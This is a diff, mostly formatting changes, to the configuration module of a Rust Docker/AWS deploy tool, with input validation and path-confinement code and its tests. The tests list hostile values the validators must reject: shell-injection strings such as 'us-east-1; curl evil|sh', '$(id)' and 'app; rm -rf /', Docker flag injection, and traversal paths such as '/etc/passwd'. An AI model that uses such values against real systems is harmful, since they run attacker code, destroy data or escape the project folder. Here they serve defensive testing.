@@ -1,4 +1,4 @@
-use anyhow::{bail, Context, Result};
+use anyhow::{Context, Result, bail};
 use serde::{Deserialize, Serialize};
 use std::path::{Path, PathBuf};
 use std::str::FromStr;
@@ -63,21 +63,38 @@ pub struct Lightsail {
 
 impl Default for Ec2 {
     fn default() -> Self {
-        Self { instance_type: d_itype() }
+        Self {
+            instance_type: d_itype(),
+        }
     }
 }
 impl Default for Lightsail {
     fn default() -> Self {
-        Self { power: d_power(), scale: d_scale() }
+        Self {
+            power: d_power(),
+            scale: d_scale(),
+        }
     }
 }
 
-fn d_dockerfile() -> String { "Dockerfile".into() }
-fn d_context() -> String { ".".into() }
-fn d_platform() -> String { "linux/amd64".into() }
-fn d_itype() -> String { "t3.micro".into() }
-fn d_power() -> String { "nano".into() }
-fn d_scale() -> i32 { 1 }
+fn d_dockerfile() -> String {
+    "Dockerfile".into()
+}
+fn d_context() -> String {
+    ".".into()
+}
+fn d_platform() -> String {
+    "linux/amd64".into()
+}
+fn d_itype() -> String {
+    "t3.micro".into()
+}
+fn d_power() -> String {
+    "nano".into()
+}
+fn d_scale() -> i32 {
+    1
+}
 
 impl Config {
     pub fn new(name: String, region: String, port: u16, target: Target) -> Self {
@@ -117,8 +134,7 @@ impl Config {
     /// Serve para editar e regravar o `skyship.toml`; para rodar um deploy use [`Config::load_from`].
     pub fn load_unresolved(dir: &Path) -> Result<Self> {
         let path = dir.join(FILE);
-        let raw = std::fs::read_to_string(&path)
-            .with_context(|| format!("não achei {}", path.display()))?;
+        let raw = std::fs::read_to_string(&path).with_context(|| format!("não achei {}", path.display()))?;
         let c: Config = toml::from_str(&raw).with_context(|| format!("{} inválido", path.display()))?;
         c.validate()?;
         Ok(c)
@@ -172,14 +188,23 @@ impl Config {
     pub fn validate(&self) -> Result<()> {
         let ok_name = !self.name.is_empty()
             && self.name.len() <= 40
-            && self.name.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
+            && self
+                .name
+                .chars()
+                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
             && !self.name.starts_with('-')
             && !self.name.ends_with('-');
         if !ok_name {
-            bail!("name deve ter só minúsculas, números e '-' (até 40 chars): {:?}", self.name);
+            bail!(
+                "name deve ter só minúsculas, números e '-' (até 40 chars): {:?}",
+                self.name
+            );
         }
         if !valid_region(&self.region) {
-            bail!("region desconhecida: {:?} (veja as aceitas com `skyship regions`)", self.region);
+            bail!(
+                "region desconhecida: {:?} (veja as aceitas com `skyship regions`)",
+                self.region
+            );
         }
         if self.port == 0 {
             bail!("port deve estar entre 1 e 65535");
@@ -190,10 +215,16 @@ impl Config {
             bail!("image inválida: {img:?} (esperava algo como meuapp:1.0)");
         }
         if !valid_platform(&self.platform) {
-            bail!("platform inválida: {:?} (esperava algo como linux/amd64)", self.platform);
+            bail!(
+                "platform inválida: {:?} (esperava algo como linux/amd64)",
+                self.platform
+            );
         }
         if !valid_instance_type(&self.ec2.instance_type) {
-            bail!("ec2.instance_type inválido: {:?} (esperava algo como t3.micro)", self.ec2.instance_type);
+            bail!(
+                "ec2.instance_type inválido: {:?} (esperava algo como t3.micro)",
+                self.ec2.instance_type
+            );
         }
         let p = &self.lightsail.power;
         if p.is_empty() || p.len() > 10 || !p.chars().all(|c| c.is_ascii_lowercase()) {
@@ -213,8 +244,14 @@ fn valid_region(r: &str) -> bool {
 
 /// `t3.micro`, `m6i.2xlarge`, `u-6tb1.metal`: duas partes separadas por um ponto.
 fn valid_instance_type(t: &str) -> bool {
-    let ok = |s: &str| !s.is_empty() && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
-    t.len() <= 30 && t.split_once('.').is_some_and(|(a, b)| ok(a) && ok(b) && !b.contains('.'))
+    let ok = |s: &str| {
+        !s.is_empty()
+            && s.chars()
+                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
+    };
+    t.len() <= 30
+        && t.split_once('.')
+            .is_some_and(|(a, b)| ok(a) && ok(b) && !b.contains('.'))
 }
 
 /// Referência de imagem Docker (`nome`, `nome:tag`, `registry/org/nome:tag`, `nome@sha256:...`).
@@ -223,7 +260,8 @@ pub fn valid_image_ref(r: &str) -> bool {
     !r.is_empty()
         && r.len() <= 200
         && r.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
-        && r.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
+        && r.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
         && !r.contains("..")
 }
 
@@ -231,7 +269,9 @@ pub fn valid_image_ref(r: &str) -> bool {
 fn valid_platform(p: &str) -> bool {
     let parts: Vec<&str> = p.split('/').collect();
     (2..=3).contains(&parts.len())
-        && parts.iter().all(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()))
+        && parts
+            .iter()
+            .all(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()))
 }
 
 /// Junta `rel` a `root`, resolve links e `..` e exige que o resultado continue dentro de `root`.
@@ -245,7 +285,10 @@ pub(crate) fn confine(root: &Path, rel: &str, field: &str) -> Result<PathBuf> {
         Ok(c) => c,
         // ainda não existe: sem como resolver links, então só vale a regra léxica (sem `..`)
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
-            if rel_path.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
+            if rel_path
+                .components()
+                .any(|c| matches!(c, std::path::Component::ParentDir))
+            {
                 bail!("{field} não pode conter `..` quando o caminho não existe: {rel:?}");
             }
             return Ok(full);
@@ -253,7 +296,10 @@ pub(crate) fn confine(root: &Path, rel: &str, field: &str) -> Result<PathBuf> {
         Err(e) => return Err(e).with_context(|| format!("{field} inacessível: {}", full.display())),
     };
     if !canon.starts_with(root) {
-        bail!("{field} aponta para fora da pasta do projeto ({}); isso não é permitido", canon.display());
+        bail!(
+            "{field} aponta para fora da pasta do projeto ({}); isso não é permitido",
+            canon.display()
+        );
     }
     Ok(canon)
 }
@@ -269,7 +315,11 @@ mod tests {
     fn project() -> PathBuf {
         use std::sync::atomic::{AtomicUsize, Ordering};
         static N: AtomicUsize = AtomicUsize::new(0);
-        let d = std::env::temp_dir().join(format!("skyship-test-{}-{}", std::process::id(), N.fetch_add(1, Ordering::SeqCst)));
+        let d = std::env::temp_dir().join(format!(
+            "skyship-test-{}-{}",
+            std::process::id(),
+            N.fetch_add(1, Ordering::SeqCst)
+        ));
         std::fs::create_dir_all(d.join("sub")).unwrap();
         std::fs::write(d.join("Dockerfile"), "FROM scratch\n").unwrap();
         d
@@ -282,7 +332,18 @@ mod tests {
 
     #[test]
     fn region_must_not_carry_shell() {
-        for bad in ["us-east-1; curl evil|sh", "us-east-1\n", "$(id)", "US-EAST-1", "us-east", "", "x-y-1", "us-east-123", "us-gov-west-1", "us-east-9"] {
+        for bad in [
+            "us-east-1; curl evil|sh",
+            "us-east-1\n",
+            "$(id)",
+            "US-EAST-1",
+            "us-east",
+            "",
+            "x-y-1",
+            "us-east-123",
+            "us-gov-west-1",
+            "us-east-9",
+        ] {
             let mut c = cfg();
             c.region = bad.into();
             assert!(c.validate().is_err(), "deveria rejeitar region {bad:?}");
@@ -296,12 +357,27 @@ mod tests {
 
     #[test]
     fn image_reference_is_validated() {
-        for good in ["meuapp", "meuapp:1.0", "gitea/gitea:1.24", "mcr.microsoft.com/dotnet/sdk:10.0", "app@sha256:abc123"] {
+        for good in [
+            "meuapp",
+            "meuapp:1.0",
+            "gitea/gitea:1.24",
+            "mcr.microsoft.com/dotnet/sdk:10.0",
+            "app@sha256:abc123",
+        ] {
             let mut c = cfg();
             c.image = Some(good.into());
             c.validate().unwrap_or_else(|e| panic!("{good}: {e}"));
         }
-        for bad in ["", "-v /:/x", "--privileged", "app; rm -rf /", "app name", "a..b", "$(id)", "app\n"] {
+        for bad in [
+            "",
+            "-v /:/x",
+            "--privileged",
+            "app; rm -rf /",
+            "app name",
+            "a..b",
+            "$(id)",
+            "app\n",
+        ] {
             let mut c = cfg();
             c.image = Some(bad.into());
             assert!(c.validate().is_err(), "deveria rejeitar image {bad:?}");
@@ -352,11 +428,20 @@ mod tests {
     #[test]
     fn paths_escaping_project_are_rejected() {
         let d = project();
-        for (ctx, df) in [("..", "Dockerfile"), ("/", "Dockerfile"), (".", "../outro/Dockerfile"), (".", "/etc/passwd"), ("sub/../..", "Dockerfile")] {
+        for (ctx, df) in [
+            ("..", "Dockerfile"),
+            ("/", "Dockerfile"),
+            (".", "../outro/Dockerfile"),
+            (".", "/etc/passwd"),
+            ("sub/../..", "Dockerfile"),
+        ] {
             let mut c = cfg();
             c.context = ctx.into();
             c.dockerfile = df.into();
-            assert!(c.confine_paths(&d).is_err(), "deveria rejeitar context={ctx:?} dockerfile={df:?}");
+            assert!(
+                c.confine_paths(&d).is_err(),
+                "deveria rejeitar context={ctx:?} dockerfile={df:?}"
+            );
         }
     }
 
@@ -389,7 +474,9 @@ mod tests {
         let loaded = Config::load_from(&d).unwrap();
         assert!(Path::new(&loaded.context).is_absolute());
 
-        let evil = std::fs::read_to_string(d.join(FILE)).unwrap().replace("context = \".\"", "context = \"..\"");
+        let evil = std::fs::read_to_string(d.join(FILE))
+            .unwrap()
+            .replace("context = \".\"", "context = \"..\"");
         std::fs::write(d.join(FILE), evil).unwrap();
         assert!(Config::load_from(&d).is_err());
     }
